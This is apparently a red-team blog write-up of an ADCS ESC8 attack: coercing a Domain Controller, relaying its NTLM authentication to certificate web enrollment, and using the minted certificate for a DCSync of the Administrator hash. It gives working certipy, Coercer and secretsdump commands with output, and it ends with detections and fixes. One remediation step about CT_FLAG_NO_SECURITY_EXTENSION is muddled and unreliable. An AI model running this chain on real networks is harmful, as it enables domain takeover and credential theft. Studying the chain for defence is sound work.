---
title: 'Breaching the Forest: From Zero to Enterprise Admin via ADCS ESC8'
date: '2026-07-22'
category: 'Tradecraft'
difficulty: 'Hard'
techniques: ['T1187', 'T1649', 'T1550.003', 'T1078.002']
tags: ['active-directory', 'adcs', 'ntlm-relay', 'privilege-escalation']
excerpt: 'A full walk from an unauthenticated foothold to Enterprise Admin by coercing a Domain Controller and relaying its NTLM authentication to the AD CS web enrollment endpoint.'
---

Active Directory Certificate Services is one of the most reliable escalation
primitives in a modern enterprise. In this engagement I chained authentication
coercion with an NTLM relay to the web enrollment endpoint — the technique
catalogued as **ESC8** — and walked out with a certificate that authenticates
as the Domain Controller itself.

> Scope note: this was performed under a signed rules-of-engagement document
> against an isolated corporate forest. Every step below assumes explicit
> written authorisation.

## The lay of the land

Initial recon from an unauthenticated position on the internal network is enough
to find the two ingredients ESC8 needs:

- A Certificate Authority exposing the **HTTP** web enrollment interface
  (`http://ca/certsrv/`), which does not enforce channel binding.
- A machine account we can *coerce* into authenticating to us.

```bash
# Enumerate CAs and enrollment endpoints
certipy find -u 'guest@corp.local' -p '' -dc-ip 10.10.0.5 -stdout

# ESC8 shows up when Web Enrollment is enabled over HTTP
[!] Web Enrollment      : Enabled  (http://ca.corp.local/certsrv)
[!] Enrollment endpoint : Vulnerable to NTLM relay (ESC8)
```

## Standing up the relay

The relay listener targets the enrollment endpoint and requests a certificate
for the incoming machine account using the `DomainController` template.

```bash
certipy relay -target 'http://ca.corp.local' -template DomainController
```

## Coercing the Domain Controller

With the relay armed, we force `DC01` to authenticate to our host. `PetitPotam`
over the `EfsRpc` interface still works against unpatched hosts; `Coercer`
sweeps every known method automatically.

```bash
coercer coerce -u attacker -p 'Passw0rd!' \
  -t 10.10.0.5 -l 10.10.0.66 --always-continue
```

The moment the DC authenticates, the relay mints a certificate:

```text
[*] Authenticating against http://ca.corp.local as CORP/DC01$
[*] Got certificate with DNS Host Name 'dc01.corp.local'
[*] Saved certificate and private key to 'dc01.pfx'
```

## Cashing in the certificate

That certificate authenticates as `DC01$`, and a Domain Controller machine
account can perform a **DCSync**. We exchange the cert for a Kerberos TGT, then
for the NT hash of `krbtgt` and any principal we like.

```bash
certipy auth -pfx dc01.pfx -dc-ip 10.10.0.5
# -> TGT + NT hash for DC01$

secretsdump.py 'corp.local/DC01$@10.10.0.5' -k -no-pass -just-dc-user Administrator
```

From here, a golden ticket or a direct `Administrator` hash is a formality.
Zero-to-Enterprise-Admin, no password ever cracked.

## Detection & remediation

This is the part that matters. The whole chain is loud if you are listening:

| Signal | Where | ATT&CK |
| --- | --- | --- |
| `EfsRpc`/`MS-RPRN` coercion from a non-DC host | DC RPC logs, Zeek `dce_rpc` | T1187 |
| Certificate request for a DC template by a relayed identity | AD CS event `4886`/`4887` | T1649 |
| Cert-based auth (`PKINIT`) immediately followed by DCSync | `4768` + `4662` correlation | T1003.006 |

**Fix it properly:**

1. Enable **Extended Protection for Authentication (EPA)** on the CA web
   enrollment endpoint, and disable HTTP entirely — HTTPS only.
2. Remove Web Enrollment where it is not strictly required.
3. Set the CA to require `CT_FLAG_NO_SECURITY_EXTENSION` handling correctly and
   audit template ACLs.
4. Deploy the `PetitPotam`/coercion patches and monitor for the coercion RPC
   calls as a high-fidelity detection.

The certificate service is a beautiful escalation path precisely because it is
trusted by everything. Treat the CA as a Tier-0 asset — because it is one.
